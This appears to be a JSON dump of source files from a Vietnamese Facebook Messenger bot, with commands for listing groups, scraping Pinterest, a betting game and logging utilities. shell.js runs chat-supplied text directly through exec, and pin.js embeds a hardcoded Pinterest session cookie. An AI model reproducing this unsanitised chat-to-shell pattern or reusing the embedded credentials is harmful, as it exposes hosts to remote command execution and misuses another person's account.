ùê´ùê®ÃõÃÄùê¢ ùêßùê°ùê®ÃÅùê¶ ùê≠ùêÆÃõÃÄ ùêÄùêÉùêåùêàùêç\\nüíù ùóüùó∂ùó≤ÃÇùóª ùóµùó≤ÃÇÃ£ ùóÆùó±ùó∫ùó∂ùóª ƒêùó≤ÃÇÃâ ƒêùòÇÃõùóºÃõÃ£ùó∞ ùó∫ùòÇÃõùóºÃõÃ£ùóª ùóØùóºùòÅ ùóπùóÆÃ£ùó∂\\nüåê ùó≥ùóØ ùóÆùó±ùó∫ùó∂ùóª: ${global.config.FACEBOOK_ADMIN}`, idgr, () =>\n                        api.sendMessage(`${global.data.botID}`, () =>\n                            api.sendMessage(`[ ùêåùêéùêÉùêÑ ] - ùòÅùóµùòÇÃõÃ£ùó∞ ùòÅùóµùó∂ ùóºùòÇùòÅ\\n(true/false)\\n\\n${msg} `, threadID, () =>\n                                api.unsendMessage(handleReply.messageID))));\n                    break;\n                }\n            }\n    }\n};\nmodule.exports.run = async function({ api, event, args }) {\n    switch (args[0]) {\n        case \"all\":\n            {\n                var inbox = await api.getThreadList(100, null, ['INBOX']);\n                let list = [...inbox].filter(group => group.isSubscribed && group.isGroup);\n                var listthread = [];\n                var listbox = [];\n                /////////\n                for (var groupInfo of list) {\n                    //let data = (await api.getThreadInfo(groupInfo.threadID));\n                    //const listUserID = event.participantIDs.filter(ID => ID);\n                    listthread.push({\n                        id: groupInfo.threadID,\n                        name: groupInfo.name || \"Ch∆∞a ƒë·∫∑t t√™n\",\n                        participants: groupInfo.participants.length\n                    });\n                }\n                /////////\n                var listbox = listthread.sort((a, b) => {\n                    if (a.participants > b.participants) return -1;\n                    if (a.participants < b.participants) return 1;\n                });\n                /////////  \n                var groupid = [];\n                var groupName = [];\n                var page = 1;\n                page = parseInt(args[0]) || 1;\n                page < -1 ? page = 1 : \"\";\n                var limit = 100000;\n                var msg = \"====„Äé ùóüùóúùó¶ùóß ùó°ùóõùó¢ÃÅùó† „Äè====\\n‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ\\n\\n\";\n                var numPage = Math.ceil(listbox.length / limit);\n\n                for (var i = limit * (page - 1); i < limit * (page - 1) + limit; i++) {\n                    if (i >= listbox.length) break;\n                    let group = listbox[i];\n                    msg += `‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ\\n${i + 1}. ${group.name}\\nüíå ùóßùóúùóó: ${group.id}\\nüë§ ùó¶ùóºÃÇÃÅ ùòÅùóµùóÆÃÄùóªùóµ ùòÉùó∂ùó≤ÃÇùóª: ${group.participants}\\n\\n`;\n                    groupid.push(group.id);\n                    groupName.push(group.name);\n                }\n                msg += `\\nùóßùóøùóÆùóªùó¥ ${page}/${numPage}\\nùóóùòÇÃÄùóªùó¥ ${global.config.PREFIX}ùóπùó∂ùòÄùòÅùóØùóºùòÖ + ùòÄùóºÃÇÃÅ ùòÅùóøùóÆùóªùó¥/ùóÆùóπùóπ\\n\\n`\n\n                api.sendMessage(msg + \"‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ\\n‚Üí ùó•ùó≤ùóΩùóπùòÜ ùó¢ùòÇùòÅ , ùóïùóÆùóª , ùó®ùóªùóØùóÆùóª + ùòÄùóºÃÇÃÅ ùòÅùóµùòÇÃõÃÅ ùòÅùòÇÃõÃ£, \\n‚Üí ùó∞ùóºÃÅ ùòÅùóµùó≤ÃÇÃâ ùóøùó≤ùóΩ ùóªùóµùó∂ùó≤ÃÇÃÄùòÇ ùòÄùóºÃÇÃÅ, ùó∞ùóÆÃÅùó∞ùóµ ùóªùóµùóÆùòÇ ùóØùóÆÃÜÃÄùóªùó¥ ùó±ùóÆÃÇÃÅùòÇ ùó∞ùóÆÃÅùó∞ùóµ ƒëùó≤ÃÇÃâ ùó¢ùòÇùòÅ, ùóïùóÆùóª, ùó®ùóªùóØùóÆùóª ùòÅùóµùóøùó≤ùóÆùó± ƒëùóºÃÅ üíù\", event.threadID, (e, data) =>\n                    global.client.handleReply.push({\n                        name: this.config.name,\n                        author: event.senderID,\n                        messageID: data.messageID,\n                        groupid,\n                        groupName,\n                        type: 'reply'\n                    })\n                )\n            }\n            break;\n\n        default:\n            try {\n                var inbox = await api.getThreadList(100, null, ['INBOX']);\n                let list = [...inbox].filter(group =>  group.isSubscribed && group.isGroup);\n                var listthread = [];\n                var listbox = [];\n                /////////\n                for (var groupInfo of list) {\n                    //let data = (await api.getThreadInfo(groupInfo.threadID));\n                    //const listUserID = event.participantIDs.filter(ID => ID);\n                    listthread.push({\n                        id: groupInfo.threadID,\n                        name: groupInfo.name || \"Ch∆∞a ƒë·∫∑t t√™n\",\nmessageCount: groupInfo.messageCount,\n                        participants: groupInfo.participants.length\n                    });\n\n                } //for\n                var listbox = listthread.sort((a, b) => {\n                    if (a.participants > b.participants) return -1;\n                    if (a.participants < b.participants) return 1;\n                });\n                var groupid = [];\n                var groupName = [];\n                var page = 1;\n                page = parseInt(args[0]) || 1;\n                page < -1 ? page = 1 : \"\";\n                var limit = 100;\n                var msg = \"=====„Äé ùóüùóúùó¶ùóß ùó°ùóõùó¢ÃÅùó† „Äè=====\\n\\n\";\n                var numPage = Math.ceil(listbox.length / limit);\n\n                for (var i = limit * (page - 1); i < limit * (page - 1) + limit; i++) {\n                    if (i >= listbox.length) break;\n                    let group = listbox[i];\n                    msg += `‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ\\n${i + 1}. ${group.name}\\n[üí¢] ‚Üí ùóßùóúùóó: ${group.id}\\n[üë§] ‚Üí ùó¶ùóºÃÇÃÅ ùòÅùóµùóÆÃÄùóªùóµ ùòÉùó∂ùó≤ÃÇùóª: ${group.participants}\\n[üí¨] ‚Üí ùóßùóºÃÇÃâùóªùó¥ ùòÅùó∂ùóª ùóªùóµùóÆÃÜÃÅùóª: ${group.messageCount}\\n`;\n                    groupid.push(group.id);\n                    groupName.push(group.name);\n                }\n                msg += `\\n‚Üí ùóßùóøùóÆùóªùó¥ ${page}/${numPage}\\ùóóùòÇÃÄùóªùó¥ ${global.config.PREFIX}ùóπùó∂ùòÄùòÅùóØùóºùòÖ + ùòÄùóºÃÇÃÅ ùòÅùóøùóÆùóªùó¥/ùóÆùóπùóπ\\n`\n\n                api.sendMessage(msg + \"‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ\\n‚Üí ùó•ùó≤ùóΩùóπùòÜ ùó¢ùòÇùòÅ , ùóïùóÆùóª , ùó®ùóªùóØùóÆùóª + ùòÄùóºÃÇÃÅ ùòÅùóµùòÇÃõÃÅ ùòÅùòÇÃõÃ£, \\n‚Üí ùó∞ùóºÃÅ ùòÅùóµùó≤ÃÇÃâ ùóøùó≤ùóΩ ùóªùóµùó∂ùó≤ÃÇÃÄùòÇ ùòÄùóºÃÇÃÅ, ùó∞ùóÆÃÅùó∞ùóµ ùóªùóµùóÆùòÇ ùóØùóÆÃÜÃÄùóªùó¥ ùó±ùóÆÃÇÃÅùòÇ ùó∞ùóÆÃÅùó∞ùóµ ƒëùó≤ÃÇÃâ ùó¢ùòÇùòÅ, ùóïùóÆùóª, ùó®ùóªùóØùóÆùóª ùòÅùóµùóøùó≤ùóÆùó± ƒëùóºÃÅ üíù\", event.threadID, (e, data) =>\n                    global.client.handleReply.push({\n                        name: this.config.name,\n                        author: event.senderID,\n                        messageID: data.messageID,\n                        groupid,\n                        groupName,\n                        type: 'reply'\n                    })\n                )\n            } catch (e) {\n                return console.log(e)\n            }\n    }\n};","path":null,"size_bytes":12324,"size_tokens":null},"lib/fca-auto/logger.js":{"content":"'use strict';\n/* eslint-disable linebreak-style */\n\nconst chalk = require('chalk');\nvar isHexcolor = require('is-hexcolor');\n\n// H√†m chuy·ªÉn ƒë·ªïi m√†u hex sang RGB\nfunction hexToRgb(hex) {\n    const result = /^#?([a-f\\d]{2})([a-f\\d]{2})([a-f\\d]{2})$/i.exec(hex);\n    return result ? {\n        r: parseInt(result[1], 16),\n        g: parseInt(result[2], 16),\n        b: parseInt(result[3], 16)\n    } : null;\n}\n\n// H√†m t·∫°o gradient gi·ªØa hai m√†u\nfunction interpolateColor(color1, color2, factor) {\n    const rgb1 = hexToRgb(color1);\n    const rgb2 = hexToRgb(color2);\n    \n    if (!rgb1 || !rgb2) return '#000000';\n\n    const r = Math.round(rgb1.r + factor * (rgb2.r - rgb1.r));\n    const g = Math.round(rgb1.g + factor * (rgb2.g - rgb1.g));\n    const b = Math.round(rgb1.b + factor * (rgb2.b - rgb1.b));\n    \n    return `#${(1 << 24 | r << 16 | g << 8 | b).toString(16).slice(1)}`;\n}\n\n// M·∫£ng m√†u cho gradient\nconst gradientColors = [\n    '#FF0000', // ƒê·ªè\n    '#FF00FF', // H·ªìng\n    '#0000FF', // Xanh d∆∞∆°ng\n    '#00FFFF', // Xanh cyan\n    '#00FF00'  // Xanh l√°\n];\n\nfunction createGradientText(text, startColor, endColor) {\n    const chars = text.split('');\n    const gradient = chars.map((char, i) => {\n        const factor = i / (chars.length - 1);\n        const color = interpolateColor(startColor, endColor, factor);\n        return chalk.hex(color)(char);\n    });\n    return gradient.join('');\n}\n\nfunction createMultiGradientText(text) {\n    const chars = text.split('');\n    const totalColors = gradientColors.length;\n    const charsPerSection = Math.ceil(chars.length / (totalColors - 1));\n    \n    return chars.map((char, i) => {\n        const section = Math.floor(i / charsPerSection);\n        const colorIndex = Math.min(section, totalColors - 2);\n        const factor = (i % charsPerSection) / charsPerSection;\n        const color = interpolateColor(\n            gradientColors[colorIndex],\n            gradientColors[colorIndex + 1],\n            factor\n        );\n        return chalk.hex(color)(char);\n    }).join('');\n}\n\nvar getText = function(/** @type {string[]} */ ...Data) {\n    var Main = (Data.splice(0,1)).toString();\n    for (let i = 0; i < Data.length; i++) Main = Main.replace(RegExp(`%${i + 1}`, 'g'), Data[i]);\n    return Main;\n};\n\n/**\n * @param {any} obj\n */\nfunction getType(obj) {\n    return Object.prototype.toString.call(obj).slice(8, -1);\n}\n\nmodule.exports = {\n    Normal: function(/** @type {string} */ Str, /** @type {() => any} */ Data, /** @type {() => void} */ Callback) {\n        if (isHexcolor(global.Fca.Require.FastConfig.MainColor) != true) {\n            this.Warning(getText(global.Fca.Require.Language.Index.InvaildMainColor, global.Fca.Require.FastConfig.MainColor), process.exit(0));\n        }\n        else {\n            const prefix = chalk.hex(global.Fca.Require.FastConfig.MainColor).bold(`${global.Fca.Require.FastConfig.MainName || '[ FCA-HZI ]'} > `);\n            const gradientMessage = createMultiGradientText(Str);\n            console.log(prefix + gradientMessage);\n        }\n        if (getType(Data) == 'Function' || getType(Data) == 'AsyncFunction') {\n            return Data();\n        }\n        if (Data) {\n            return Data;\n        }\n        if (getType(Callback) == 'Function' || getType(Callback) == 'AsyncFunction') {\n            Callback();\n        }\n        else return Callback;\n    },\n    Warning: function(/** @type {unknown} */ str, /** @type {() => void} */ callback) {\n        const gradientMessage = createGradientText(String(str), '#FFD700', '#FFA500'); // Gradient t·ª´ v√†ng sang cam\n        console.log(chalk.magenta.bold('[ FCA-WARNING ] > ') + gradientMessage);\n        if (getType(callback) == 'Function' || getType(callback) == 'AsyncFunction') {\n            callback();\n        }\n        else return callback;\n    },\n    Error: function(/** @type {unknown} */ str, /** @type {() => void} */ callback) {\n        if (!str) {\n            console.log(chalk.magenta.bold('[ FCA-ERROR ] > ') + createGradientText(\"Already Faulty, Please Contact: Facebook.com/Lazic.Kanzu\", '#FF0000', '#8B0000'));\n        }\n        const gradientMessage = createGradientText(String(str), '#FF0000', '#8B0000'); // Gradient t·ª´ ƒë·ªè s√°ng sang ƒë·ªè ƒë·∫≠m\n        console.log(chalk.magenta.bold('[ FCA-ERROR ] > ') + gradientMessage);\n        if (getType(callback) == 'Function' || getType(callback) == 'AsyncFunction') {\n            callback();\n        }\n        else return callback;\n    },\n    Success: function(/** @type {unknown} */ str, /** @type {() => void} */ callback) {\n        const gradientMessage = createGradientText(String(str), '#00FF00', '#006400'); // Gradient t·ª´ xanh l√° s√°ng sang xanh l√° ƒë·∫≠m\n        console.log(chalk.hex('#9900FF').bold(`${global.Fca.Require.FastConfig.MainName || '[ FCA-HZI ]'} > `) + gradientMessage);\n        if (getType(callback) == 'Function' || getType(callback) == 'AsyncFunction') {\n            callback();\n        }\n        else return callback;\n    },\n    Info: function(/** @type {unknown} */ str, /** @type {() => void} */ callback) {\n        const gradientMessage = createGradientText(String(str), '#00BFFF', '#0000FF'); // Gradient t·ª´ xanh d∆∞∆°ng nh·∫°t sang xanh d∆∞∆°ng ƒë·∫≠m\n        console.log(chalk.hex('#9900FF').bold(`${global.Fca.Require.FastConfig.MainName || '[ FCA-HZI ]'} > `) + gradientMessage);\n        if (getType(callback) == 'Function' || getType(callback) == 'AsyncFunction') {\n            callback();\n        }\n        else return callback;\n    }\n};","path":null,"size_bytes":5519,"size_tokens":null},"lib/Fca-Horizon-Remastered/Extra/Src/Release_Memory.js":{"content":"/* eslint-disable linebreak-style */\nconst fs = require('fs');\nconst path = require('path');\nconst v8 = require('v8');\nconst EventEmitter = require('events');\n\nclass MemoryManager extends EventEmitter {\n  constructor(options = {}) {\n    super();\n    this.thresholds = {\n      warning: options.warningThreshold || 0.7,\n      release: options.releaseThreshold || 0.8,\n      max: options.maxThreshold || 0.9,\n    };\n    this.interval = options.interval || 5000;\n    this.logLevel = options.logLevel || 'info';\n    this.logFile = options.logFile || path.join(__dirname, 'memory.log');\n    this.allowLog = options.allowLog || true;\n    this.weakRefs = new WeakMap();\n    this.smartReleaseEnabled = options.smartReleaseEnabled || false;\n    this.memoryUsageHistory = [];\n  }\n\n  start() {\n    this.intervalId = setInterval(() => {\n      const memoryUsage = this.getMemoryUsage();\n      this.logMemoryUsage(memoryUsage);\n\n      if (memoryUsage > this.thresholds.warning) {\n        this.emit('memoryWarning', memoryUsage);\n      }\n\n      if (memoryUsage > this.thresholds.release) {\n        this.releaseMemory(memoryUsage);\n      }\n\n      if (memoryUsage > this.thresholds.max) {\n        this.emit('memoryMax', memoryUsage);\n      }\n\n      if (this.smartReleaseEnabled) {\n        this.memoryUsageHistory.push(memoryUsage);\n        this.smartRelease();\n      }\n    }, this.interval);\n  }\n\n  stop() {\n    clearInterval(this.intervalId);\n  }\n\n  getMemoryUsage() {\n    const heapStats = v8.getHeapStatistics();\n    const totalHeapSize = heapStats.total_available_size / 1024 / 1024;\n    const usedHeapSize = heapStats.used_heap_size / 1024 / 1024;\n    return usedHeapSize / totalHeapSize;\n  }\n\n  releaseMemory(memoryUsage) {\n    if (global.gc) {\n      global.gc();\n    } else {\n      v8.setFlagsFromString('--expose_gc');\n      const vm = require('vm');\n      vm.runInNewContext('gc')();\n    }\n    this.emit('memoryReleased', memoryUsage);\n  }\n\n  logMemoryUsage(memoryUsage) {\n    const timestamp = new Date().toLocaleString(\"vi-vn\", {timeZone: \"Asia/Ho_Chi_Minh\"});\n    const logMessage = `${timestamp} - Memory usage: ${(memoryUsage * 100).toFixed(2)}%`;\n\n    switch (this.logLevel) {\n      case 'debug':\n        console.debug(logMessage);\n        break;\n      case 'info':\n        global.Fca.Require.logger.Info(logMessage);\n        break;\n      case 'warn':\n        global.Fca.Require.logger.Normal(logMessage);\n        break;\n      case 'error':\n        global.Fca.Require.logger.Error(logMessage);\n        break;\n      default:\n        global.Fca.Require.logger.Normal(logMessage);\n    }\n    if (this.allowLog) {\n      fs.appendFile(this.logFile, `${logMessage}\\n`, (err) => {\n        if (err) throw err;\n      });\n    }\n  }\n\n  onMaxMemory(callback) {\n    this.on('memoryMax', callback);\n  }\n\n  addMemoryUsageListener(callback) {\n    this.on('memoryWarning', callback);\n    this.on('memoryReleased', callback);\n    this.on('memoryMax', callback);\n  }\n\n  removeMemoryUsageListener(callback) {\n    this.off('memoryWarning', callback);\n    this.off('memoryReleased', callback);\n    this.off('memoryMax', callback);\n  }\n\n  addThreshold(type, value) {\n    if (type === 'warning' || type === 'release' || type === 'max') {\n      this.thresholds[type] = value;\n    } else {\n      throw new Error('Invalid threshold type');\n    }\n  }\n\n  removeThreshold(type) {\n    if (type === 'warning' || type === 'release' || type === 'max') {\n      delete this.thresholds[type];\n    } else {\n      throw new Error('Invalid threshold type');\n    }\n  }\n\n  smartRelease() {\n    const memoryUsageHistory = this.memoryUsageHistory.slice(-100);\n    const averageUsage = memoryUsageHistory.reduce((sum, usage) => sum + usage, 0) / memoryUsageHistory.length;\n    const maxUsage = Math.max(...memoryUsageHistory);\n\n    if (averageUsage > this.thresholds.release && maxUsage > this.thresholds.max) {\n      this.releaseMemory(maxUsage);\n    }\n  }\n\n  autoStart(interval) { //1h\n    this.stopMemoryManager();\n    this.startMemoryManager();\n    this.autoStartInterval = setInterval(() => {\n      this.stopMemoryManager();\n      this.startMemoryManager();\n    }, interval);\n  }\n\n  stopMemoryManager() {\n    this.stop();\n    clearInterval(this.intervalId);\n    clearInterval(this.autoStartInterval);\n  }\n  \n  startMemoryManager() {\n    this.start();\n  }\n\n}\n\nmodule.exports = MemoryManager;","path":null,"size_bytes":4346,"size_tokens":null},"modules/commands/vdgai.js":{"content":"module.exports.config = {\n  name: \"vdgai\",\n  version: \"2.0.0\",\n  hasPermssion: 0,\n  credits: \"Vtuan\",\n  Rent: 2,\n  description: \"Xem video v·ªÅ anime chill\",\n  commandCategory: \"Random-img\",\n  usages: \"\",\n  cooldowns: 30\n};\n\nmodule.exports.run = async ({ api, event ,Users}) => {\n  const axios = require('axios');\n  const request = require('request');\n  const fs = require(\"fs\");\n  const video = require('./../../img/vdgai.json');\n  const randomVideo = video[Math.floor(Math.random() * video.length)].trim();\n  const fileName = '2.mp4';\n  const filePath = __dirname + `/${fileName}`;\n\n  function downloadAndSendImage(image, fileName, callback) {\n    request(image).pipe(fs.createWriteStream(fileName)).on(\"close\", callback);\n  }\n\n  let callback = function () {\n    return api.sendMessage({\n      body: 'Video g√°i c·ªßa b·∫°n ƒë√¢y',\n      attachment: [\n        fs.createReadStream(filePath)\n      ]\n    }, event.threadID, () => {\n      fs.unlinkSync(filePath);\n    }, event.messageID);\n  };\n  downloadAndSendImage(randomVideo, filePath, callback);\n}\n","path":null,"size_bytes":1051,"size_tokens":null},"lib/fca-auto/src/markAsRead.js":{"content":"\"use strict\";\n\nvar utils = require(\"../utils\");\nvar log = require(\"npmlog\");\n\nmodule.exports = function (defaultFuncs, api, ctx) {\n  return async function markAsRead(threadID, read, callback) {\n    if (utils.getType(read) === 'Function' || utils.getType(read) === 'AsyncFunction') {\n      callback = read;\n      read = true;\n    }\n    if (read == undefined) read = true;\n\n    if (!callback) callback = () => { };\n\n    var form = {};\n\n    if (typeof ctx.globalOptions.pageID !== 'undefined') {\n      form[\"source\"] = \"PagesManagerMessagesInterface\";\n      form[\"request_user_id\"] = ctx.globalOptions.pageID;\n      form[\"ids[\" + threadID + \"]\"] = read;\n      form[\"watermarkTimestamp\"] = new Date().getTime();\n      form[\"shouldSendReadReceipt\"] = true;\n      form[\"commerce_last_message_type\"] = \"\";\n      //form[\"titanOriginatedThreadId\"] = utils.generateThreadingID(ctx.clientID);\n\n      let resData;\n      try {\n        resData = await (\n          defaultFuncs\n            .post(\"https://www.facebook.com/ajax/mercury/change_read_status.php\", ctx.jar, form)\n            .then(utils.saveCookies(ctx.jar))\n            .then(utils.parseAndCheckLogin(ctx, defaultFuncs))\n        );\n      }\n      catch (e) {\n        callback(e);\n        return e;\n      }\n\n      if (resData.error) {\n        let err = resData.error;\n        log.error(\"markAsRead\", err);\n        if (utils.getType(err) == \"Object\" && err.error === \"Not logged in.\") ctx.loggedIn = false;\n        callback(err);\n        return err;\n      }\n\n      callback();\n      return null;\n    }\n    else {\n      try {\n        if (ctx.mqttClient) {\n          let err = await new Promise(r => ctx.mqttClient.publish(\"/mark_thread\", JSON.stringify({\n            threadID,\n            mark: \"read\",\n            state: read\n          }), { qos: 1, retain: false }, r));\n          if (err) throw err;\n        }\n        else throw { error: \"You can only use this function after you start listening.\" };\n      }\n      catch (e) {\n        callback(e);\n        return e;\n      }\n    }\n  };\n};\n","path":null,"size_bytes":2035,"size_tokens":null},"modules/commands/pin.js":{"content":"module.exports.config = {\n    name: \"pin\",\n    version: \"0.0.1\",\n    hasPermssion: 0,\n    credits: \"meow\",\n    description: \"Pinterest\",\n    commandCategory: \"Ti·ªán √≠ch\",\n    usages: \"pin text - number\",\n    cooldowns: 0\n  };\n  module.exports.run = async function({ api, event, args }) {\n      const axios = require(\"axios\");\n      const fs = require(\"fs-extra\");\n      const request = require(\"request\");\n      const name = args.join(\" \").trim().replace(/\\s+/g, \" \").replace(/(\\s+\\|)/g, \"|\").replace(/\\|\\s+/g, \"|\").split(\"-\")[0];\n      const number = args.join(\" \").trim().replace(/\\s+/g, \" \").replace(/(\\s+\\|)/g, \"|\").replace(/\\|\\s+/g, \"|\").split(\"-\")[1] || 6;\n      if(!name || !number ){ return api.sendMessage(\"Missing Data\", event.threadID)}\n      var headers = {\n          'authority': 'www.pinterest.com',\n          'cache-control': 'max-age=0',\n          'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',\n          'upgrade-insecure-requests': '1',\n          'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36',\n          'sec-gpc': '1',\n          'sec-fetch-site': 'same-origin',\n          'sec-fetch-mode': 'same-origin',\n          'sec-fetch-dest': 'empty',\n          'accept-language': 'en-US,en;q=0.9',\n          'cookie': 'csrftoken=92c7c57416496066c4cd5a47a2448e28; g_state={\"i_l\":0}; _auth=1; _pinterest_sess=TWc9PSZBMEhrWHJZbHhCVW1OSzE1MW0zSkVid1o4Uk1laXRzdmNwYll3eEFQV0lDSGNRaDBPTGNNUk5JQTBhczFOM0ZJZ1ZJbEpQYlIyUmFkNzlBV2kyaDRiWTI4THFVUWhpNUpRYjR4M2dxblJCRFhESlBIaGMwbjFQWFc2NHRtL3RUcTZna1c3K0VjVTgyejFDa1VqdXQ2ZEQ3NG91L1JTRHZwZHNIcDZraEp1L0lCbkJWUytvRis2ckdrVlNTVytzOFp3ZlpTdWtCOURnbGc3SHhQOWJPTzArY3BhMVEwOTZDVzg5VDQ3S1NxYXZGUEEwOTZBR21LNC9VZXRFTkErYmtIOW9OOEU3ektvY3ZhU0hZWVcxS0VXT3dTaFpVWXNuOHhiQWdZdS9vY24wMnRvdjBGYWo4SDY3MEYwSEtBV2JxYisxMVVsV01McmpKY0VOQ3NYSUt2ZDJaWld6T0RacUd6WktITkRpZzRCaWlCTjRtVXNMcGZaNG9QcC80Ty9ZZWFjZkVGNURNZWVoNTY4elMyd2wySWhtdWFvS2dQcktqMmVUYmlNODBxT29XRWx5dWZSc1FDY0ZONlZJdE9yUGY5L0p3M1JXYkRTUDAralduQ2xxR3VTZzBveUc2Ykx3VW5CQ0FQeVo5VE8wTEVmamhwWkxwMy9SaTNlRUpoQmNQaHREbjMxRlRrOWtwTVI5MXl6cmN1K2NOTFNyU1cyMjREN1ZFSHpHY0ZCR1RocWRjVFZVWG9VcVpwbXNGdlptVzRUSkNadVc1TnlBTVNGQmFmUmtrNHNkVEhXZytLQjNUTURlZXBUMG9GZ3YwQnVNcERDak16Nlp0Tk13dmNsWG82U2xIKyt5WFhSMm1QUktYYmhYSDNhWnB3RWxTUUttQklEeGpCdE4wQlNNOVRzRXE2NkVjUDFKcndvUzNMM2pMT2dGM05WalV2QStmMC9iT055djFsYVBKZjRFTkRtMGZZcWFYSEYvNFJrYTZSbVRGOXVISER1blA5L2psdURIbkFxcTZLT3RGeGswSnRHdGNpN29KdGFlWUxtdHNpSjNXQVorTjR2NGVTZWkwPSZzd3cwOXZNV3VpZlprR0VBempKdjZqS00ybWM9; _b=\"AV+pPg4VpvlGtL+qN4q0j+vNT7JhUErvp+4TyMybo+d7CIZ9QFohXDj6+jQlg9uD6Zc=\"; _routing_id=\"d5da9818-8ce2-4424-ad1e-d55dfe1b9aed\"; sessionFunnelEventLogged=1'\n      };\n  \n      var options = {\n          url: 'https://www.pinterest.com/search/pins/?q=' + (encodeURIComponent(name)) + '&rs=typed&term_meta[]=' + (encodeURIComponent(name)) + '%7Ctyped',\n          headers: headers\n      };\n    async function callback(error, response, body) {\n          const imgabc = [];\n          if (!error && response.statusCode == 200) {\n              const arrMatch = body.match(/https:\\/\\/i\\.pinimg\\.com\\/originals\\/[^.]+\\.jpg/g);\n  for(let i = 0; i < number; i++){\n    const t = await axios.get(`${arrMatch[i]}`, {\n          responseType: \"stream\"\n        })\n    const o = t.data\n    imgabc.push(o)\n  }\n            var msg = ({\n        body: `‚ñ∫ ùó£ùóúùó°ùóßùóòùó•ùóòùó¶ùóß\\n\\n${name} - ${number}`,\n        attachment: imgabc\n       })\n      return api.sendMessage(msg, event.threadID, event.messageID)\n          }\n      }\n      request(options, callback);\n        }","path":null,"size_bytes":3697,"size_tokens":null},"modules/commands/kbb.js":{"content":"module.exports.config = { \n    name: \"kbb\",\n    version: \"1.2.0\",\n    hasPermssion: 0,\n    credits: \"D-Jukie\",\n    description: \"K√©o b√∫a bao (O·∫≥n t√π t√¨) ng·∫´u nhi√™n\",\n    commandCategory: \"Tr√≤ Ch∆°i\",\n    usages: \"[k√©o/b√∫a/bao] [s·ªë ti·ªÅn]\",\n    cooldowns: 0\n};\n\nmodule.exports.run = async function({ api, event, args, Currencies }) {\n    const { threadID, messageID, senderID } = event;\n    const money = (await Currencies.getData(senderID)).money;\n\n    const choices = [\"k√©o\", \"b√∫a\", \"bao\"];\n    const icons = { \"k√©o\": \"‚úå\", \"b√∫a\": \"‚úä\", \"bao\": \"‚úã\" };\n\n    if (!args[0]) return api.sendMessage(\"C√°ch ch∆°i: kbb k√©o/b√∫a/bao s·ªë ti·ªÅn v√≠ d·ª•: kbb k√©o 1000\", threadID, messageID);\n    const userChoice = args[0].toLowerCase();\n    if (!choices.includes(userChoice)) return api.sendMessage(\"L·ª±a ch·ªçn kh√¥ng h·ª£p l·ªá! Ch·ªçn k√©o, b√∫a ho·∫∑c bao.\", threadID, messageID);\n\n    const coins = parseInt(args[1]) || 0;\n    if (coins < 50) return api.sendMessage(\"M·ª©c c∆∞·ª£c ph·∫£i >= 50$\", threadID, messageID);\n    if (money < coins) return api.sendMessage(`B·∫°n kh√¥ng ƒë·ªß ${coins}$ ƒë·ªÉ ch∆°i`, threadID, messageID);\n\nfunction randomChoice(arr) {\n    return arr[Math.floor(Math.random() * arr.length)];\n}\nconst botChoice = randomChoice(choices);\n\n\n    // So s√°nh k·∫øt qu·∫£\n    let result, moneyChange;\n    if (userChoice === botChoice) {\n        result = \"H√≤a\";\n        moneyChange = 0;\n    } else if (\n        (userChoice === \"k√©o\" && botChoice === \"bao\") ||\n        (userChoice === \"b√∫a\" && botChoice === \"k√©o\") ||\n        (userChoice === \"bao\" && botChoice === \"b√∫a\")\n    ) {\n        result = \"B·∫°n th·∫Øng\";\n        moneyChange = coins;\n        await Currencies.setData(senderID, { money: money + coins });\n    } else {\n        result = \"B·∫°n thua\";\n        moneyChange = -coins;\n        await Currencies.setData(senderID, { money: money - coins });\n    }\n\n    const msg = `\nK·∫øt qu·∫£:\nNg∆∞·ªùi: ${icons[userChoice]} ${userChoice}\nBot: ${icons[botChoice]} ${botChoice}\n\n${result} ${moneyChange > 0 ? `‚Üí C·ªông: ${moneyChange}$` : moneyChange < 0 ? `‚Üí Tr·ª´: ${-moneyChange}$` : \"\"}\n    `;\n    return api.sendMessage(msg, threadID, messageID);\n};\n","path":null,"size_bytes":2204,"size_tokens":null},"modules/commands/shell.js":{"content":"module.exports.config = {\n\tname: \"shell\",\n\tversion: \"7.3.1\",\n\thasPermssion: 3,\n\tcredits: \"Nguyen üåè\",\n\tdescription: \"running shell\",\n\tcommandCategory: \"H·ªá Th·ªëng\",\n\tusages: \"[shell]\",\n\tcooldowns: 0,\n\tdependencies: {\n\t\t\"child_process\": \"\"\n\t}\n};\nmodule.exports.run = async function({ api, event, args, Threads, Users, Currencies, models }) {    \nconst { exec } = require(\"child_process\");\nlet text = args.join(\" \")\nexec(`${text}`, (error, stdout, stderr) => {\n    if (error) {\n        api.sendMessage(`ùêã·ªóùê¢: \\n${error.message}`, event.threadID, event.messageID);\n        return;\n    }\n    if (stderr) {\n        api.sendMessage(`stderr:\\n ${stderr}`, event.threadID, event.messageID);\n        return;\n    }\n    api.sendMessage(`stdout:\\n ${stdout}`, event.threadID, event.messageID);\n});\n}","path":null,"size_bytes":798,"size_tokens":null},"lib/fca-auto/Extra/Src/Last-Run.js":{"content":"/* eslint-disable linebreak-style */\n'use strict';\n\nvar assert = require('assert');\n\nvar runtimes = new WeakMap();\n\n/**\n * @param {any} fn\n */\nfunction isFunction(fn) {\n  return typeof fn === 'function';\n}\n\n/**\n * @param {object} fn\n * @param {string} timeResolution\n */\nfunction lastRun(fn, timeResolution) {\n  assert(isFunction(fn), 'Only functions can check 